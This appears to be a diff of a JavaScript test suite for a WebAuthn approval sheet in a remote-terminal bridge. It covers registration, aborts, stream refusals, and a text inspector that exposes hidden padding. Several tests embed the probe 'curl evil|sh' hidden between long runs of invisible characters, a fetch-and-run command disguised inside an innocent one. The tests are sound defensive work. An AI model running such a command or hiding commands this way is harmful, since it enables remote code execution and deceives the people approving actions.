@@ -26,11 +26,12 @@ const refusal = (extra = {}, code = "assertion_required") => ({ code, rid: I.rid
 const NOW = I.expires_ms - 60_000;
 
 // A window whose authenticator signs nothing real but answers like one: clientDataJSON carries the challenge it was given.
-function win({ fail = null, credential = CRED, echo = null, type = "webauthn.get" } = {}) {
+function win({ hang = false, fail = null, credential = CRED, echo = null, type = "webauthn.get" } = {}) {
   const w = { gets: [] };
   w.top = w.self = w;
   w.navigator = { credentials: { async get(o) {
     w.gets.push(o);
+    if (hang) return new Promise((_, rej) => o.signal?.addEventListener("abort", () => rej(Object.assign(new Error("a"), { name: "AbortError" }))));
     if (fail) throw Object.assign(new Error("x"), { name: fail });
     const challenge = echo ?? o.publicKey.challenge;
     return { rawId: credential.buffer.slice(0), response: { authenticatorData: new Uint8Array([1, 2, 3]),
@@ -201,33 +202,62 @@ test("every failure has a fixed sentence and none of them is the passphrase", ()
 
 // ---- registration at pairing ---------------------------------------------------------------------------------------
 
-test("registration: begin, then the person's click, then the credential, then finish; no platform authenticator means no begin", async () => {
-  const sent = [], order = [];
+function regWin(order = [], seen = {}) {
   const w = { top: null, PublicKeyCredential: { isUserVerifyingPlatformAuthenticatorAvailable: async () => true } };
   w.top = w.self = w;
   w.navigator = { credentials: { async create(o) {
     order.push("create");
-    assert.equal(o.publicKey.authenticatorSelection.userVerification, "required");
-    assert.equal(o.publicKey.authenticatorSelection.authenticatorAttachment, "platform");
-    assert.equal(o.publicKey.attestation, "none");
-    assert.deepEqual(o.publicKey.pubKeyCredParams, [{ type: "public-key", alg: -7 }]);
-    assert.equal(bytesToHex(new Uint8Array(o.publicKey.challenge)), VEC.assertion.registration_challenge.challenge);
+    seen.options = o;
     return { rawId: CRED.buffer.slice(0), response: { attestationObject: new Uint8Array([7]).buffer, clientDataJSON: new Uint8Array([8]).buffer } };
   } } };
-  const rc = VEC.assertion.registration_challenge;
-  const send = async (m) => { sent.push(m.op); order.push(m.op); return m.op === "credential_begin" ? { nonce: rc.nonce, expires_ms: rc.expires_ms } : { registered: true, synced: true }; };
-  const r = await U.registerCredential({ session: session(), label: "Phone", send, gate: async () => { order.push("click"); }, win: w });
+  return w;
+}
+const RC = VEC.assertion.registration_challenge;
+
+test("registration: begin and the challenge first, create() INSIDE the person's click, then finish", async () => {
+  const order = [], seen = {};
+  const send = async (m) => { order.push(m.op); return m.op === "credential_begin" ? { nonce: RC.nonce, expires_ms: RC.expires_ms } : { registered: true, synced: true }; };
+  const click = (run) => { order.push("click"); const p = run(); order.push("after run()"); return p; };
+  const r = await U.registerCredential({ session: session(), label: "Phone", send, click, win: regWin(order, seen), now: () => RC.expires_ms - 100_000 });
   assert.deepEqual(r, { ok: true, credentialId: b64u(CRED), synced: true });
-  assert.deepEqual(sent, ["credential_begin", "credential_finish"]);
-  assert.deepEqual(order, ["click", "credential_begin", "create", "credential_finish"]);      // nothing asked of the host before the click
+  assert.deepEqual(order, ["credential_begin", "click", "create", "after run()", "credential_finish"]);   // create ran before run() returned
+  const o = seen.options.publicKey;
+  assert.equal(o.authenticatorSelection.userVerification, "required");
+  assert.equal(o.authenticatorSelection.authenticatorAttachment, "platform");
+  assert.equal(o.attestation, "none");
+  assert.deepEqual(o.pubKeyCredParams, [{ type: "public-key", alg: -7 }]);
+  assert.equal(bytesToHex(new Uint8Array(o.challenge)), RC.challenge);
+});
+
+test("registration: a click after the host's window redoes begin and asks for a second click, once", async () => {
+  let t = 1_000_000;
+  const begins = [], clicks = [], order = [];
+  const send = async (m) => { if (m.op === "credential_begin") { begins.push(t); return { nonce: RC.nonce, expires_ms: t + 120_000 }; } return { registered: true }; };
+  const click = (run, again) => { clicks.push(again); if (!again) t += 130_000; return run(); };
+  const r = await U.registerCredential({ session: session(), label: "P", send, click, win: regWin(order), now: () => t });
+  assert.equal(r.ok, true);
+  assert.deepEqual(clicks, [false, true]);
+  assert.equal(begins.length, 2);
+  assert.deepEqual(order, ["create"]);
+  const never = [];
+  const late = await U.registerCredential({ session: session(), label: "P", send, click: (run, again) => { t += 130_000; return run(); }, win: regWin(never), now: () => t });
+  assert.deepEqual(late, { ok: false, reason: "timeout" });
+  assert.deepEqual(never, []);                                            // no ceremony with an expired challenge
+});
+
+test("registration: no platform authenticator means no begin; a refusal, a timeout and an abort are said", async () => {
   const none = await U.registerCredential({ session: session(), label: "P", send: async () => assert.fail("asked the host"), win: { PublicKeyCredential: { isUserVerifyingPlatformAuthenticatorAvailable: async () => false } } });
   assert.deepEqual(none, { ok: false, reason: "no_platform" });
-  const refused = await U.registerCredential({ session: session(), label: "P", send: async () => null, win: w });
-  assert.deepEqual(refused, { ok: false, reason: "refused" });
-  const slow = await U.registerCredential({ session: session(), label: "P", send: async () => assert.fail("asked the host before the click"), win: w,
-    gate: async () => { throw Object.assign(new Error("late"), { name: "TimeoutError" }); } });
+  assert.deepEqual(await U.registerCredential({ session: session(), label: "P", send: async () => null, win: regWin() }), { ok: false, reason: "refused" });
+  const slow = await U.registerCredential({ session: session(), label: "P", send: async () => ({ nonce: RC.nonce, expires_ms: RC.expires_ms }), win: regWin(),
+    click: async () => { throw Object.assign(new Error("late"), { name: "TimeoutError" }); } });
   assert.deepEqual(slow, { ok: false, reason: "timeout" });
   assert.match(U.unlockText("timeout"), /took too long/);
+  const ac = new AbortController(), seen = {};
+  await U.registerCredential({ session: session(), label: "P", send: async (m) => (m.op === "credential_begin" ? { nonce: RC.nonce, expires_ms: RC.expires_ms } : { registered: true }),
+    win: regWin([], seen), signal: ac.signal, now: () => RC.expires_ms - 100_000,
+    click: (run) => { const p = run(); assert.equal(seen.options.signal.aborted, false); ac.abort(); return p; } });
+  assert.equal(seen.options.signal.aborted, true);                        // an OS prompt still up is withdrawn
 });
 
 // ---- the transport: ask once, send the proof once ---------------------------------------------------------------------
@@ -361,7 +391,8 @@ test("a normal short subject reaches the sheet unchanged, with no tail line", as
   assert.equal(log.drawn[0].tail, "");
   log.drawn[0].onCancel();
   await p;
-  assert.deepEqual(U.inspectText("a\n\nb"), { text: "a\n\nb", lines: 3, chars: 4, tail: "a\n\nb", ok: true });
+  const v = U.inspectText("a\n\nb");
+  assert.deepEqual([v.ok, v.text, v.lines, v.chars, v.tail], [true, "a\n\nb", 3, 4, "a\n\nb"]);
 });
 
 test("an abort closes the sheet, resolves cancelled and frees the next ask", async () => {
@@ -417,4 +448,192 @@ test("the challenge uses the scope the host named, not a fixed one", async () =>
     assert.deepEqual(new Uint8Array(w.gets[0].publicKey.challenge), want);
     assert.match(log.drawn[0].facts.join(" "), new RegExp(`Needs: ${scope}`));
   }
+});
+
+test("an abort after Confirm withdraws the authenticator's prompt, and so does the timeout", async () => {
+  const ac = new AbortController(), w = win({ hang: true }), log = sheets();
+  const p = ask(session(), refusal(), w, log, { signal: ac.signal });
+  await drawn(log);
+  log.drawn[0].onConfirm();
+  assert.equal(w.gets[0].signal.aborted, false);
+  ac.abort();
+  assert.deepEqual(await p, { ok: false, reason: "cancelled" });
+  assert.equal(w.gets[0].signal.aborted, true);
+  const w2 = win({ hang: true }), log2 = sheets();
+  const q = U.askAssertion(session(), refusal(), { win: w2, now: () => I.expires_ms - 30, draw: log2.draw, delayMs: 0 });
+  await drawn(log2);
+  log2.drawn[0].onConfirm();
+  assert.deepEqual(await q, { ok: false, reason: "expired" });
+  assert.equal(w2.gets[0].signal.aborted, true);
+});
+
+// ---- hidden padding inside a line, and spacing that cannot be told from text ---------------------------------------------
+
+const NB = "\u00a0";
+const refused = async (shown, text) => {
+  const log = sheets(), w = win();
+  const r = await ask(session(), refusal({ subject: subj(shown) }), w, log);
+  assert.deepEqual(r, { ok: false, reason: "bad_request", text }, JSON.stringify(shown.slice(0, 30)));
+  assert.equal(log.drawn.length, 0);
+  assert.equal(w.gets.length, 0);
+};
+
+test("the exact probe: 900 no-break spaces hiding the middle of a line is refused, and so is every other invisible filler", async () => {
+  await refused("git status " + NB.repeat(900) + "curl evil|sh" + NB.repeat(900) + " # done", U.UNLOCK_TEXT.odd_text);
+  const fillers = ["\u2800", "\u3000", "\u1680", "\u202f", "\u205f", "\u2028", "\u2029", "\t", "\r", "\u200b", "\u200d", "\u202e", "\u2066", "\u00ad", "\u180e", "\ue000", "\u0378", "\u0600", "\u06dd", "\ufe0f", "\u115f", "\u3164", "\u0085", "\u001b",
+    ...Array.from({ length: 11 }, (_, i) => String.fromCharCode(0x2000 + i))];
+  for (const f of fillers) {
+    await refused("git status " + f.repeat(900) + "curl evil|sh" + f.repeat(900) + " # done", U.UNLOCK_TEXT.odd_text);
+    await refused(`a${f}b`, U.UNLOCK_TEXT.odd_text);
+  }
+  await refused("a " + NB + " b" + "\u2800".repeat(3), U.UNLOCK_TEXT.odd_text);      // mixed
+});
+
+test("printable text, ASCII spaces and line feeds are untouched; a run of 3 spaces or more is a marker, never refused", async () => {
+  for (const ok of ["ls -la", "a  b", "x\ny", "caf\u00e9 \u2603 \u4e2d\u6587", "e\u0301\u0301", "[\u2026 blank lines \u2026]", "[900 spaces]"]) {
+    const v = U.inspectText(ok);
+    assert.equal(v.ok, true, ok);
+    assert.equal(v.text, ok);
+    assert.ok(v.atoms.every((a) => a.t === "c"), ok);                      // all plain text, no marker element
+  }
+  const code = "if x:\n    run()\n        deeper(1)\nend";
+  const v = U.inspectText(code);
+  assert.equal(v.ok, true);
+  assert.deepEqual(v.atoms.filter((a) => a.t === "s").map((a) => a.n), [4, 8]);
+  assert.equal(v.text, "if x:\n[4 spaces]run()\n[8 spaces]deeper(1)\nend");
+  assert.equal(v.lines, 4);
+  assert.equal(U.inspectText("a   b").atoms.filter((a) => a.t === "s").length, 1);          // exactly 3
+  assert.equal(U.inspectText("a  b").atoms.filter((a) => a.t === "s").length, 0);           // exactly 2: plain
+  const pad = U.inspectText("git status" + " ".repeat(900) + "curl evil|sh" + " ".repeat(900) + " # done");
+  assert.equal(pad.ok, true);
+  assert.deepEqual(pad.atoms.filter((a) => a.t === "s").map((a) => a.n), [900, 901]);
+  assert.match(pad.tail, /\[901 spaces\]# done$/);
+  const log = sheets();
+  const p = ask(session(), refusal({ subject: subj(code) }), win(), log);
+  await drawn(log);
+  assert.ok(log.drawn[0].atoms.some((a) => a.t === "s" && a.n === 8));
+  log.drawn[0].onCancel();
+  await p;
+});
+
+test("a typed look-alike of a marker stays plain text: only the device makes markers", () => {
+  const typed = U.inspectText("[\u2026 blank lines \u2026]\n[5 spaces]");
+  assert.deepEqual(typed.atoms.map((a) => a.t), ["c", "c", "c"]);
+  const real = U.inspectText("a\n\n\nb   c");
+  assert.deepEqual(real.atoms.map((a) => a.t), ["c", "c", "b", "c", "c", "s", "c"]);
+});
+
+test("combining marks: two in a row are fine, three are refused", async () => {
+  assert.equal(U.inspectText("e\u0301\u0302").ok, true);
+  assert.equal(U.inspectText("e\u0301e\u0301\u0302x\u0301").ok, true);
+  await refused("e" + "\u0301".repeat(3), U.UNLOCK_TEXT.odd_text);
+  await refused("e" + "\u0301".repeat(40), U.UNLOCK_TEXT.odd_text);
+});
+
+test("empty lines: one stays, two or more are one marker, whitespace-only lines count as empty; limits are exact", () => {
+  assert.equal(U.inspectText("a\n\nb").text, "a\n\nb");
+  assert.equal(U.inspectText("a\n\n\nb").text, "a\n" + U.BLANKS + "\nb");          // exactly two empty lines
+  assert.equal(U.inspectText("a\n   \n \nb").text, "a\n" + U.BLANKS + "\nb");        // spaces only
+  assert.equal(U.inspectText("a\n  \nb").text, "a\n\nb");
+  assert.equal(U.inspectText("a" + "\n".repeat(50) + "b").lines, 3);
+  const lines = (n) => Array.from({ length: n }, (_, i) => "l" + i).join("\n");
+  assert.equal(U.inspectText(lines(40)).ok, true);
+  assert.equal(U.inspectText(lines(41)).ok, false);
+  assert.equal(U.inspectText("a".repeat(2000)).ok, true);
+  assert.equal(U.inspectText("a".repeat(2001)).ok, false);
+  assert.equal(U.inspectText(" ".repeat(2000)).ok, true);                             // all spaces is one blank line: nothing to hide
+  assert.equal(U.inspectText("a" + " ".repeat(2000)).ok, false);
+  assert.equal(U.inspectText("\u{1F600}".repeat(2000)).ok, true);                     // counted in characters, not code units
+  assert.equal(U.inspectText("\u{1F600}".repeat(2001)).ok, false);
+  const marked = "x\n\n\n" + lines(38);                                           // 1 + marker + 38 = 40 rows
+  assert.equal(U.inspectText(marked).lines, 40);
+  assert.equal(U.inspectText(marked).ok, true);
+  assert.equal(U.inspectText(marked + "\nz").ok, false);
+});
+
+// ---- streams share the refusal path (R10 streams, #96) ---------------------------------------------------------------
+
+const SSE = () => ({ result: "accept", rid: "x", last: true, refusal: false, meta: { status: 200, headers: { "content-type": "text/event-stream" } }, data: new Uint8Array(0) });
+const SREQ = (extra = {}) => ({ method: "GET", path: "/term/out", headers: {}, body: null, stream: true, signal: new AbortController().signal, ...extra });
+const FASTS = { reconnectMs: 0, reconnectMax: 0, floorMs: 0 };
+
+test("a stream refused for an assertion goes through the same sheet and opens with the proof, flagged STREAM", async () => {
+  const r = rig([need("lease_required"), SSE]);
+  let asked = 0;
+  const unlock = async (s, rf) => { asked++; assert.equal(rf.code, "lease_required"); return { ok: true, meta: { op: "assert", for: rf.rid } }; };
+  const ev = await collect(T.bridgeTransport({ ...r, ...FASTS, unlock }).request(SREQ()));
+  assert.deepEqual(ev.map((e) => e.type), ["head", "end"]);
+  assert.equal(asked, 1);
+  assert.equal(r.session.requests.length, 2);
+  assert.equal(r.session.requests[1].meta.op, "assert");
+  assert.equal(r.session.requests[1].flags, 2);                          // the proof carries the STREAM flag of the request it allows
+});
+
+test("a stream whose sheet was declined is not asked about again at once; after the pause it is", async () => {
+  let t = 1_000_000, asked = 0;
+  const r = rig([need(), need()]);
+  const unlock = async () => { asked++; return { ok: false, reason: "cancelled" }; };
+  const tr = T.bridgeTransport({ ...r, ...FASTS, unlock, now: () => t });
+  await assert.rejects(collect(tr.request(SREQ())), (e) => e.code === "assertion_required" && e.message === U.unlockText("cancelled"));
+  assert.equal(asked, 1);
+  await assert.rejects(collect(tr.request(SREQ())), (e) => e.message === U.unlockText("cancelled"));      // the frame's reconnect
+  await assert.rejects(collect(tr.request(SREQ())), (e) => e.message === U.unlockText("cancelled"));
+  assert.equal(asked, 1);
+  assert.equal(r.session.requests.length, 1);                            // nothing was sent for the reconnects
+  t += T.DECLINED_MS + 1;
+  await assert.rejects(collect(tr.request(SREQ())), (e) => e.code === "assertion_required");
+  assert.equal(asked, 2);
+  const other = await collect(T.bridgeTransport({ ...rig([SSE]), ...FASTS, unlock }).request(SREQ()));      // an open lease: no refusal, no sheet
+  assert.equal(other.length, 2);
+  assert.equal(asked, 2);
+});
+
+test("a busy sheet does not count as a decline", async () => {
+  const r = rig([need(), need()]);
+  const tr = T.bridgeTransport({ ...r, ...FASTS, unlock: async () => ({ ok: false, reason: "busy" }) });
+  await assert.rejects(collect(tr.request(SREQ())), (e) => e.message === U.unlockText("busy"));
+  await assert.rejects(collect(tr.request(SREQ())), (e) => e.message === U.unlockText("busy"));
+  assert.equal(r.session.requests.length, 2);                            // asked for again: the second request really went out
+});
+
+// ---- one parser: what the sheet processes against what the challenge commits to ------------------------------------------
+
+test("canonical JSON and the subject hash agree with the Python reference for astral characters, combining marks, separators and escapes", async () => {
+  const B = await import(new URL("bridge-crypto.js", JS));
+  assert.ok(VEC.assertion.subject_cases.length >= 8);
+  for (const c of VEC.assertion.subject_cases) {
+    const subject = { kind: "action", shown: c.shown, digest: "" };
+    assert.equal(C.canonicalJson(B.subjectOf(subject)), c.subject_json, c.name);
+    assert.equal(bytesToHex(new Uint8Array(await crypto.subtle.digest("SHA-256", te.encode(c.subject_json)))), c.subject_hash, c.name);
+  }
+  const nfc = VEC.assertion.subject_cases.find((c) => c.name === "nfc"), nfd = VEC.assertion.subject_cases.find((c) => c.name === "combining_nfd");
+  assert.notEqual(nfc.subject_hash, nfd.subject_hash);                      // no normalisation anywhere
+  const lone = JSON.parse(VEC.assertion.subject_invalid.lone_surrogate_json_text);
+  assert.equal(VEC.assertion.subject_invalid.host_refuses, true);
+  assert.throws(() => B.subjectOf({ kind: "action", shown: lone, digest: "" }), TypeError);      // refused on both sides
+  assert.deepEqual(await ask(session(), refusal({ subject: subj(lone) }), win(), sheets()), { ok: false, reason: "bad_request" });
+});
+
+test("the challenge always covers the ORIGINAL text, never the collapsed view", async () => {
+  const B = await import(new URL("bridge-crypto.js", JS));
+  for (const shown of [PAD, "if x:\n    run()", "a" + " ".repeat(40) + "b", "x\n \n\n   \ny"]) {
+    const w = win(), log = sheets();
+    const p = ask(session(), refusal({ subject: subj(shown) }), w, log);
+    await drawn(log);
+    assert.notEqual(log.drawn[0].text, shown);                                // the view is processed ...
+    log.drawn[0].onConfirm();
+    await p;
+    const want = await B.assertionChallenge({ workspace: hex(I.workspace), deviceId: hex(I.device), rid: hex(I.rid), purpose: "fresh", scope: I.scope,
+      expiresMs: I.expires_ms, nonce: hex(I.nonce), subject: subj(shown) });
+    assert.deepEqual(new Uint8Array(w.gets[0].publicKey.challenge), want);     // ... the hash is not
+  }
+});
+
+test("counts are code points, lines are LF only, and 'empty' means ASCII spaces only", () => {
+  assert.equal(U.inspectText("\u{1F600}".repeat(2000)).chars, 2000);        // UTF-16 length would be 4000
+  assert.equal(U.inspectText("a\u{10FFFF}".repeat(1)).ok, false);           // unassigned: refused whatever its length
+  assert.equal(U.inspectText("a\r\nb").ok, false);                          // CR is never a line end here: refused
+  assert.equal(U.inspectText("a\nb").lines, 2);
+  assert.equal(U.inspectText("a\n \u00a0\nb").ok, false);                   // a no-break space is not "empty": refused, not collapsed
+  assert.equal(U.inspectText("a\n\t\nb").ok, false);
 });
